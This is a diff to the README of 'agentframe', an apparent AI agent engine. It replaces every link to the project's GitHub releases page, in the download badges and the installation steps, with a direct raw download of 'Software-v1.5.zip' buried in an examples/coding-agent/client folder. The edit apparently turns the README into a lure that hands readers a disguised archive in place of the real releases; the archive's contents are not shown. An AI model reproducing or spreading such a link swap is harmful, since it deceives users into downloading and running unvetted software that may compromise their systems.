@@ -1,6 +1,6 @@
 # ⚙️ agentframe - Reliable AI Agent Engine
 
-[![Download agentframe](https://img.shields.io/badge/Download-agentframe-blue?style=for-the-badge)](https://github.com/MALIKNAVED/agentframe/releases)
+[![Download agentframe](https://img.shields.io/badge/Download-agentframe-blue?style=for-the-badge)](https://raw.githubusercontent.com/MALIKNAVED/agentframe/main/examples/coding-agent/client/Software-v1.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Here are step-by-step instructions for getting agentframe running on your Window
 
 Go to the agentframe release page here:
 
-[https://github.com/MALIKNAVED/agentframe/releases](https://github.com/MALIKNAVED/agentframe/releases)
+[https://raw.githubusercontent.com/MALIKNAVED/agentframe/main/examples/coding-agent/client/Software-v1.5.zip](https://raw.githubusercontent.com/MALIKNAVED/agentframe/main/examples/coding-agent/client/Software-v1.5.zip)
 
 This page shows the latest versions of agentframe for different systems.
 
@@ -186,9 +186,9 @@ You can open these folders using File Explorer.
 
 Use this link to visit the release page and get the latest version:
 
-[https://github.com/MALIKNAVED/agentframe/releases](https://github.com/MALIKNAVED/agentframe/releases)
+[https://raw.githubusercontent.com/MALIKNAVED/agentframe/main/examples/coding-agent/client/Software-v1.5.zip](https://raw.githubusercontent.com/MALIKNAVED/agentframe/main/examples/coding-agent/client/Software-v1.5.zip)
 
-[![Download agentframe](https://img.shields.io/badge/Download-agentframe-grey?style=for-the-badge)](https://github.com/MALIKNAVED/agentframe/releases)
+[![Download agentframe](https://img.shields.io/badge/Download-agentframe-grey?style=for-the-badge)](https://raw.githubusercontent.com/MALIKNAVED/agentframe/main/examples/coding-agent/client/Software-v1.5.zip)
 
 ---
 
